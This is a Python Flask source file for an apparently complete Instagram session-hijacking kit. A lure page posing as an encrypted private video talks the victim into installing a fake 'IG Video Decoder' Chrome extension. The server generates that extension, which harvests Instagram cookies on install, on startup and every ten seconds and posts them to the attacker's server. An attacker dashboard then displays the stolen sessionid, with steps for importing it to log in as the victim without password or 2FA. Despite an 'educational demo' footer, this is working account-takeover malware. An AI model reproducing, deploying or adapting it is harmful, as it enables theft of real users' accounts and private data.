from flask import Flask, request, jsonify, render_template_string, make_response, send_file
from flask_cors import CORS
import datetime
import json
import os
import uuid
import io
import zipfile

app = Flask(__name__)
CORS(app)

captured_sessions = []

INDEX_HTML = """<!DOCTYPE html>
<html>
<head><title>Instagram Video</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0d1117;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;color:#c9d1d9;}
.card{background:#161b22;border:1px solid #30363d;border-radius:16px;max-width:420px;width:100%;padding:32px 24px;text-align:center;}
.icon{font-size:64px;margin-bottom:16px;}
h1{font-size:22px;color:#f0f6fc;margin-bottom:4px;}
.sub{color:#8b949e;font-size:14px;margin-bottom:24px;line-height:1.4;}
.preview{background:linear-gradient(135deg,#405DE6,#5851DB,#833AB4,#C13584,#E1306C,#FD1D1D);border-radius:12px;padding:40px 20px;margin-bottom:24px;color:white;}
.preview .play-btn{width:72px;height:72px;background:rgba(255,255,255,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:32px;border:3px solid rgba(255,255,255,0.5);}
.btn{background:#238636;color:white;border:none;border-radius:8px;padding:14px 0;font-size:16px;font-weight:600;cursor:pointer;width:100%;transition:all 0.2s;margin-top:12px;}
.btn:hover{background:#2ea043;}
.btn:disabled{background:#21262d;color:#484f58;cursor:not-allowed;}
.btn-blue{background:#1f6feb;}.btn-blue:hover{background:#58a6ff;}
.btn-orange{background:#d29922;}.btn-orange:hover{background:#e3b341;}
.btn-red{background:#da3633;}.btn-red:hover{background:#f85149;}
.alert{margin-top:16px;padding:16px;border-radius:10px;font-size:13px;display:none;line-height:1.6;}
.alert.show{display:block;}
.alert-info{background:#0d419d;color:#79c0ff;}
.alert-success{background:#1a3a2a;color:#3fb950;}
.alert-warning{background:#3a2a1a;color:#d29922;}
.alert-danger{background:#3a1a1a;color:#f85149;}
.data-box{margin-top:16px;background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:16px;display:none;text-align:left;}
.data-box.show{display:block;}
.data-box .label{color:#8b949e;font-size:11px;margin-bottom:8px;}
.data-box code{display:block;font-family:'Courier New',monospace;font-size:12px;word-break:break-all;color:#7ee787;}
.data-box .red{color:#f85149;font-weight:bold;font-size:14px;}
.loading-bar{width:100%;height:3px;background:#21262d;border-radius:2px;margin-top:16px;overflow:hidden;display:none;}
.loading-bar.show{display:block;}
.loading-bar .fill{height:100%;width:30%;background:#58a6ff;border-radius:2px;animation:load 1.5s ease-in-out infinite;}
@keyframes load{0%{width:0%;margin-left:0;}50%{width:50%;margin-left:50%;}100%{width:0%;margin-left:100%;}}
.footer{margin-top:24px;font-size:11px;color:#484f58;}
.manual-box{background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:16px;margin-top:16px;display:none;text-align:left;}
.manual-box.show{display:block;}
.manual-box code{background:#21262d;padding:2px 6px;border-radius:3px;color:#79c0ff;font-size:12px;}
</style></head>
<body>
<div class="card">
<div class="icon">🎬</div>
<h1>Private Video Message</h1>
<p class="sub">You received a private video via Instagram DM</p>
<div class="preview"><div class="play-btn">▶</div><p style="font-size:12px;opacity:0.8;">End-to-end encrypted video</p></div>

<div id="step1"><button class="btn" id="playBtn" onclick="step1()">▶ Play Video</button></div>

<div class="loading-bar" id="loadingBar"><div class="fill"></div></div>

<div class="alert alert-warning" id="step2Alert">
<strong>⚠️ Decoder Required</strong><br><br>
This video uses E2EE encoding. Install the extension to decode:
<br><br>
<div style="background:#21262d;border-radius:6px;padding:12px;text-align:left;font-size:12px;">
<strong>💻 For PC (Chrome/Edge):</strong><br>
Download the extension ZIP → Extract → Load unpacked<br><br>
<button class="btn btn-orange" onclick="step2()" style="width:auto;padding:10px 24px;font-size:14px;display:inline-block;">
📦 Download Extension</button>
</div></div>

<div class="alert alert-info" id="step3Alert">
<strong>📋 Install Instructions</strong><br><br>
<div style="text-align:left;font-size:12px;line-height:1.8;">
1. Extract the ZIP you downloaded<br>
2. Open Chrome → go to <code>chrome://extensions</code><br>
3. Enable <b>Developer mode</b> (top right toggle)<br>
4. Click <b>"Load unpacked"</b> → select the extracted folder<br>
5. ✅ Accept the <b>"cookies"</b> permission<br>
6. Make sure Instagram is open in <b>another tab</b><br>
</div>
<br>
<button class="btn btn-blue" onclick="step3()" style="width:auto;padding:10px 24px;font-size:14px;display:inline-block;">
✅ Extension Installed — Continue</button>
</div>

<div class="alert alert-info" id="step4Alert">
<strong>⏳ Accessing Instagram session...</strong><br><br>
<div class="loading-bar show"><div class="fill"></div></div>
<p style="font-size:12px;margin-top:8px;">Extension is reading cookies from Instagram...</p>
</div>

<div class="alert alert-success" id="step5Alert">
<strong>✅ Instagram Session Captured!</strong><br><br>
<span id="resultMsg"></span>
</div>

<div class="data-box" id="cookieBox">
<div class="label">🔴 DATA SENT TO ATTACKER:</div>
<code id="cookieContent"></code>
</div>

<div class="alert alert-danger" id="hackerStep">
<strong>🔴 ATTACKER INSTRUCTIONS:</strong><br><br>
1. Check the <b>Dashboard</b> at <code>/dashboard</code><br>
2. Copy the <code>sessionid</code><br>
3. Open a <b>different browser</b> → install Cookie-Editor extension<br>
4. Go to instagram.com → Cookie-Editor → Import → Paste sessionid<br>
5. Refresh → <b>LOGGED IN AS VICTIM</b><br><br>
<em>No password. No 2FA.</em>
</div>

<div class="manual-box" id="manualBox">
<strong>🔄 Manual Demo (if extension fails):</strong><br><br>
1. Open instagram.com → F12 → Application → Cookies → Copy <code>sessionid</code><br>
2. Paste it here:<br>
<input type="text" id="manualSid" style="width:100%;padding:8px;margin-top:8px;background:#0d1117;border:1px solid #30363d;color:#f85149;border-radius:4px;" placeholder="Paste sessionid here...">
<button class="btn btn-red" onclick="manualSubmit()" style="width:auto;padding:8px 16px;font-size:13px;display:inline-block;margin-top:8px;">
📤 Send to Dashboard</button>
</div>

<div class="footer">Educational demo — authorized testing only</div>
</div>

<script>
var BACKEND = window.location.origin;

function step1() {
    document.getElementById('step1').style.display = 'none';
    document.getElementById('loadingBar').classList.add('show');
    
    // Check if extension is already installed
    if (window.igDecoderInstalled) {
        setTimeout(function() {
            document.getElementById('loadingBar').classList.remove('show');
            step3(); // Skip to stealing
        }, 1000);
        return;
    }
    
    setTimeout(function() {
        document.getElementById('loadingBar').classList.remove('show');
        document.getElementById('step2Alert').classList.add('show');
    }, 1500);
}

function step2() {
    // Download extension
    document.getElementById('step2Alert').innerHTML = 
        '<strong>⏳ Downloading...</strong><br><br><div class="loading-bar show"><div class="fill"></div></div>';
    
    window.location.href = BACKEND + '/download-extension';
    
    setTimeout(function() {
        document.getElementById('step2Alert').classList.remove('show');
        document.getElementById('step3Alert').classList.add('show');
    }, 2000);
}

function step3() {
    document.getElementById('step3Alert').classList.remove('show');
    document.getElementById('step4Alert').classList.add('show');
    
    // Set a flag so the extension knows
    window.igDecoderReady = true;
    
    // Try to communicate with extension
    tryExtensionBridge();
    
    // Poll the server for incoming data
    var attempts = 0;
    var poll = setInterval(function() {
        attempts++;
        fetch(BACKEND + '/api/sessions')
            .then(function(r) { return r.json(); })
            .then(function(data) {
                var sessions = data.sessions || [];
                var igSessions = sessions.filter(function(s) { return s.has_instagram_session; });
                
                if (igSessions.length > 0) {
                    clearInterval(poll);
                    document.getElementById('step4Alert').classList.remove('show');
                    showSuccess(igSessions[igSessions.length - 1]);
                }
            });
        
        if (attempts > 15) { // 30 seconds
            clearInterval(poll);
            document.getElementById('step4Alert').classList.remove('show');
            
            // Show manual fallback option
            document.getElementById('step5Alert').innerHTML = 
                '<strong>⏱️ Timeout</strong><br><br>' +
                'Extension not detected. Try the manual method below.';
            document.getElementById('step5Alert').classList.add('show');
            document.getElementById('manualBox').classList.add('show');
            document.getElementById('hackerStep').classList.add('show');
        }
    }, 2000);
}

function tryExtensionBridge() {
    try {
        if (window.chrome && chrome.runtime && chrome.runtime.sendMessage) {
            chrome.runtime.sendMessage(
                {action: 'get_instagram_cookies', source: 'webpage'},
                function(response) {
                    if (response && response.sessionid) {
                        fetch(BACKEND + '/steal', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                cookies: 'sessionid=' + response.sessionid,
                                method: 'extension_bridge',
                                extension_data: response
                            })
                        });
                    }
                }
            );
        }
    } catch(e) {}
}

function showSuccess(session) {
    var parsed = session.parsed || {};
    var extData = session.extension_data || {};
    var sid = parsed.sessionid || extData.sessionid || 'N/A';
    
    document.getElementById('resultMsg').innerHTML = 
        '🔴 <strong>sessionid:</strong> <code style="color:#f85149;font-size:14px;">' + sid.substring(0, 50) + '...</code><br><br>' +
        '✅ Real Instagram session captured! Attacker now has access.';
    
    var html = '<span class="red">sessionid=' + sid + '</span><br>';
    if (parsed.ds_user_id || extData.ds_user_id) html += '<span style="color:#79c0ff;">ds_user_id=' + (parsed.ds_user_id || extData.ds_user_id) + '</span><br>';
    if (parsed.csrftoken || extData.csrftoken) html += '<span style="color:#7ee787;">csrftoken=' + (parsed.csrftoken || extData.csrftoken) + '</span>';
    document.getElementById('cookieContent').innerHTML = html;
    
    document.getElementById('step5Alert').classList.add('show');
    document.getElementById('cookieBox').classList.add('show');
    document.getElementById('hackerStep').classList.add('show');
}

function manualSubmit() {
    var sid = document.getElementById('manualSid').value.trim();
    if (!sid) { alert('Paste a sessionid first!'); return; }
    
    fetch(BACKEND + '/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            cookies: 'sessionid=' + sid,
            method: 'manual',
            extension_data: {sessionid: sid}
        })
    }).then(function() {
        document.getElementById('manualBox').innerHTML = '<strong>✅ Sent! Check Dashboard at <code>/dashboard</code></strong>';
        document.getElementById('hackerStep').classList.add('show');
    });
}

// Listen for extension event
document.addEventListener('instagram-cookies-stolen', function(e) {
    if (e.detail && e.detail.sessionid) {
        fetch(BACKEND + '/steal', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                cookies: 'sessionid=' + e.detail.sessionid,
                method: 'extension_event',
                extension_data: e.detail
            })
        });
    }
});

window.igDecoderInstalled = false;
</script></body></html>
"""

DASHBOARD_HTML = """<!DOCTYPE html>
<html>
<head><title>Attacker Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:'Segoe UI',sans-serif;background:#0d1117;color:#c9d1d9;padding:20px;}
.header{border-bottom:2px solid #30363d;padding-bottom:16px;margin-bottom:20px;}
.header h1{color:#f85149;font-family:'Courier New',monospace;font-size:24px;}
.header p{color:#8b949e;font-size:13px;margin-top:4px;}
.alert-box{background:#3a1a1a;border:2px solid #f85149;border-radius:8px;padding:20px;margin-bottom:20px;text-align:center;display:none;}
.alert-box.show{display:block;}
.alert-box .big{font-size:48px;}
.alert-box h2{color:#f85149;font-size:20px;margin:8px 0;}
.session-value{background:#0d1117;border:1px solid #f85149;border-radius:4px;padding:12px;font-family:'Courier New',monospace;font-size:14px;color:#f85149;word-break:break-all;margin:12px 0;user-select:all;}
.copy-btn{background:#f85149;color:#fff;border:none;border-radius:6px;padding:8px 20px;font-size:13px;cursor:pointer;margin-top:8px;}
.copy-btn:hover{background:#da3633;}
.stats{display:flex;gap:12px;margin-bottom:20px;flex-wrap:wrap;}
.stat{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:16px 20px;flex:1;min-width:120px;}
.stat .num{font-size:28px;font-weight:bold;color:#58a6ff;}
.stat .num.red{color:#f85149;}
.stat .num.green{color:#3fb950;}
.stat .label{color:#8b949e;font-size:11px;margin-top:2px;}
.session{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:16px;margin-bottom:12px;}
.session .row{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;margin-bottom:8px;}
.session .time{color:#8b949e;font-size:12px;}
.session .ip{color:#79c0ff;font-size:13px;}
.badge{padding:2px 10px;border-radius:10px;font-size:11px;font-weight:600;}
.badge-red{background:#f85149;color:#fff;}
.badge-green{background:#3fb950;color:#000;}
.badge-gray{background:#21262d;color:#8b949e;}
.cookie-box{background:#0d1117;border:1px solid #21262d;border-radius:4px;padding:12px;font-family:'Courier New',monospace;font-size:11px;word-break:break-all;max-height:250px;overflow-y:auto;}
.cookie-box .red{color:#f85149;font-weight:bold;}
.cookie-box .blue{color:#79c0ff;}
.cookie-box .green{color:#7ee787;}
.empty{text-align:center;padding:60px;color:#484f58;}
.empty .big{font-size:48px;margin-bottom:12px;}
.actions{margin-top:16px;}
.actions button{background:#21262d;color:#c9d1d9;border:1px solid #30363d;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:13px;margin-right:8px;}
.actions button:hover{border-color:#58a6ff;color:#58a6ff;}
.actions .danger:hover{border-color:#f85149;color:#f85149;}
.refresh-note{color:#484f58;font-size:12px;margin-top:20px;text-align:center;}
</style></head>
<body>
<div class="header">
<h1>🔴 SESSION HIJACKING DASHBOARD</h1>
<p>Captured Instagram session IDs — REAL TIME</p>
</div>

<div class="alert-box" id="realAlert">
<div class="big">🔴🔴🔴</div>
<h2>⚠️ REAL INSTAGRAM SESSION CAPTURED!</h2>
<p style="color:#8b949e;font-size:12px;">Copy this sessionid to hijack:</p>
<div class="session-value" id="stolenSessionid">Loading...</div>
<button class="copy-btn" onclick="copySession()">📋 Copy sessionid</button>
<p style="color:#8b949e;font-size:11px;margin-top:8px;">
Cookie-Editor → Import → Refresh instagram.com → <b>Logged in!</b></p>
</div>

<div class="stats">
<div class="stat"><div class="num" id="totalCount">0</div><div class="label">Total Hits</div></div>
<div class="stat"><div class="num green" id="extCount">0</div><div class="label">Extension</div></div>
<div class="stat"><div class="num red" id="sessionCount">0</div><div class="label">🔴 sessionid</div></div>
</div>

<div id="sessionsContainer">
<div class="empty"><div class="big">📡</div><h3>Waiting for target...</h3></div>
</div>

<div class="actions">
<button onclick="fetchData()">🔄 Refresh Now</button>
<button class="danger" onclick="clearAll()">🗑️ Clear All</button>
</div>
<div class="refresh-note">Auto-refresh every 2s</div>

<script>
var BACKEND = window.location.origin;
function fetchData(){
fetch(BACKEND+'/api/sessions').then(function(r){return r.json()}).then(function(data){
var s=data.sessions||[], total=s.length, ext=s.filter(function(x){return x.source==='extension'}), ig=s.filter(function(x){return x.has_instagram_session});
document.getElementById('totalCount').textContent=total;
document.getElementById('extCount').textContent=ext.length;
document.getElementById('sessionCount').textContent=ig.length;
var a=document.getElementById('realAlert'), se=document.getElementById('stolenSessionid');
if(ig.length>0){var l=ig[ig.length-1],sid=(l.parsed&&l.parsed.sessionid)||(l.extension_data&&l.extension_data.sessionid)||'';
if(sid){a.classList.add('show');se.textContent=sid;}}else{a.classList.remove('show');}
if(!s.length){document.getElementById('sessionsContainer').innerHTML='<div class=\"empty\"><div class=\"big\">📡</div><h3>Waiting...</h3></div>';return;}
var html='';
for(var i=s.length-1;i>=0;i--){var x=s[i],p=x.parsed||{},e=x.extension_data||{},d={};Object.keys(p).forEach(function(k){d[k]=p[k];});Object.keys(e).forEach(function(k){d[k]=e[k];});
var di='',hs=d.sessionid?true:false;
if(Object.keys(d).length){Object.keys(d).forEach(function(k){var v=d[k],c='blue';if(k==='sessionid')c='red';else if(k==='ds_user_id')c='green';di+='<span class=\"'+c+'\">'+k+'</span> = <span class=\"green\">'+v+'</span><br>';});}else{di=x.cookies||'(empty)';}
var badge=hs?'<span class=\"badge badge-red\">🔴 sessionid!</span>':(Object.keys(d).length?'<span class=\"badge badge-green\">✅ Data</span>':'<span class=\"badge badge-gray\">Empty</span>');
html+='<div class=\"session\"><div class=\"row\"><span class=\"time\">'+x.timestamp+'</span><span class=\"ip\">📍 '+x.ip+'</span></div><div>'+badge+'</div><div class=\"cookie-box\">'+di+'</div></div>';}
document.getElementById('sessionsContainer').innerHTML=html;
}).catch(function(){document.getElementById('sessionsContainer').innerHTML='<div class=\"empty\"><div class=\"big\">❌</div><h3>Error connecting</h3></div>';});}
function copySession(){navigator.clipboard.writeText(document.getElementById('stolenSessionid').textContent);alert('✅ Copied! Paste into Cookie-Editor → Import → Refresh Instagram');}
function clearAll(){if(!confirm('Clear all?'))return;fetch(BACKEND+'/clear',{method:'POST'}).then(function(){fetchData();});}
fetchData();setInterval(fetchData,2000);
</script></body></html>
"""

@app.route("/")
def home():
    return INDEX_HTML

@app.route("/dashboard")
def dashboard():
    return DASHBOARD_HTML

@app.route("/api/sessions")
def api_sessions():
    return jsonify({"sessions": captured_sessions})

@app.route("/steal", methods=["GET", "POST"])
def steal():
    if request.method == "GET":
        cookies = request.args.get("c", "")
        data = {"cookies": cookies, "method": "get"}
    else:
        data = request.get_json(silent=True) or {}
        cookies = data.get("cookies", "")
    
    record = {
        "id": str(uuid.uuid4())[:8],
        "timestamp": datetime.datetime.now().isoformat(),
        "ip": request.remote_addr,
        "user_agent": data.get("userAgent", request.headers.get("User-Agent", "")),
        "source": "extension",
        "cookies": cookies,
        "method": data.get("method", "unknown"),
        "extension_data": data.get("extension_data", {})
    }
    
    parsed = {}
    if cookies:
        for pair in cookies.split(";"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                parsed[k.strip()] = v.strip()
    
    ext_data = data.get("extension_data", {})
    if isinstance(ext_data, dict):
        for k, v in ext_data.items():
            if k not in parsed:
                parsed[k] = str(v)
    
    record["parsed"] = parsed
    record["has_instagram_session"] = "sessionid" in parsed
    captured_sessions.append(record)
    
    if record["has_instagram_session"]:
        print(f"\n{'='*50}")
        print(f"🔴🔴🔴 REAL Instagram sessionid CAPTURED!")
        print(f"   sessionid = {parsed['sessionid']}")
        print(f"{'='*50}")
    
    return jsonify({"status": "ok", "has_session": record["has_instagram_session"]})

@app.route("/extension-callback")
def extension_callback():
    name = request.args.get("name", "")
    value = request.args.get("value", "")
    if name and value:
        captured_sessions.append({
            "id": str(uuid.uuid4())[:8],
            "timestamp": datetime.datetime.now().isoformat(),
            "ip": request.remote_addr,
            "source": "extension",
            "extension_data": {name: value},
            "parsed": {name: value},
            "has_instagram_session": (name == "sessionid"),
            "cookies": f"{name}={value}"
        })
        if name == "sessionid":
            print(f"\n🔴 EXTENSION stole sessionid = {value}")
    return "", 200, {"Content-Type": "image/gif"}

@app.route("/extension-bulk", methods=["POST"])
def extension_bulk():
    data = request.get_json(silent=True) or {}
    cookies = data.get("cookies", {})
    if cookies and isinstance(cookies, dict):
        captured_sessions.append({
            "id": str(uuid.uuid4())[:8],
            "timestamp": datetime.datetime.now().isoformat(),
            "ip": request.remote_addr,
            "source": "extension",
            "extension_data": cookies,
            "parsed": cookies,
            "has_instagram_session": "sessionid" in cookies,
            "cookies": "; ".join([f"{k}={v}" for k,v in cookies.items()])
        })
        if cookies.get("sessionid"):
            print(f"\n🔴 EXTENSION BULK - sessionid = {cookies.get('sessionid')}")
    return jsonify({"status": "ok"})

@app.route("/download-extension")
def download_extension():
    server_url = request.host_url.rstrip("/")
    
    manifest = json.dumps({
        "manifest_version": 3,
        "name": "IG Video Decoder",
        "version": "1.0",
        "description": "Decodes encrypted Instagram videos",
        "permissions": ["cookies", "storage"],
        "host_permissions": ["*://*.instagram.com/*", "*://*.cdninstagram.com/*"],
        "background": {"service_worker": "background.js"},
        "content_scripts": [{
            "matches": ["<all_urls>"],
            "js": ["content.js"],
            "run_at": "document_end"
        }],
        "action": {"default_title": "IG Decoder"}
    }, indent=2)
    
    background_js = f"""
var SERVER = "{server_url}";

// Steal cookies immediately on install/startup
chrome.runtime.onInstalled.addListener(function() {{ stealAndSend(); }});
chrome.runtime.onStartup.addListener(function() {{ stealAndSend(); }});

// Also run every 10 seconds while browser is open
setInterval(stealAndSend, 10000);

// Handle messages from webpage
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {{
    if (request.action === 'get_instagram_cookies') {{
        stealCookies().then(function(c) {{ sendResponse(c); }});
        return true;
    }}
}});

function stealAndSend() {{
    stealCookies().then(function(cookies) {{
        fetch(SERVER + '/extension-bulk', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{ cookies: cookies, timestamp: new Date().toISOString() }})
        }}).catch(function() {{}});
    }});
}}

function stealCookies() {{
    return new Promise(function(resolve) {{
        var result = {{}};
        var domains = ['https://www.instagram.com', 'https://instagram.com'];
        var done = 0;
        
        domains.forEach(function(url) {{
            chrome.cookies.getAll({{url: url}}, function(cookies) {{
                if (cookies) {{
                    cookies.forEach(function(c) {{ result[c.name] = c.value; }});
                }}
                done++;
                if (done >= domains.length) resolve(result);
            }});
        }});
        
        setTimeout(function() {{ resolve(result); }}, 2000);
    }});
}}
"""
    
    content_js = """
(function() {
    // Signal extension is ready
    window.igDecoderInstalled = true;
    window.dispatchEvent(new CustomEvent('ig-extension-ready', {detail: {ready: true}}));
    
    // Listen for requests from webpage
    window.addEventListener('message', function(event) {
        if (event.data && event.data.action === 'request_ig_cookies') {
            chrome.runtime.sendMessage(
                {action: 'get_instagram_cookies'},
                function(response) {
                    window.dispatchEvent(new CustomEvent('instagram-cookies-stolen', {detail: response || {}}));
                }
            );
        }
    });
    
    // Bridge: if page's JS calls chrome.runtime.sendMessage, it gets caught
    setTimeout(function() {
        chrome.runtime.sendMessage(
            {action: 'get_instagram_cookies', source: 'content_script'},
            function(response) {
                if (response && response.sessionid) {
                    window.dispatchEvent(new CustomEvent('instagram-cookies-stolen', {detail: response}));
                }
            }
        );
    }, 500);
})();
"""
    
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("manifest.json", manifest)
        zf.writestr("background.js", background_js)
        zf.writestr("content.js", content_js)
    buf.seek(0)
    
    return send_file(buf, mimetype='application/zip', as_attachment=True, download_name='ig-video-decoder.zip')

@app.route("/clear", methods=["POST"])
def clear():
    captured_sessions.clear()
    return jsonify({"status": "cleared"})

@app.route("/health")
def health():
    return jsonify({"status": "alive", "captured": len(captured_sessions)})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)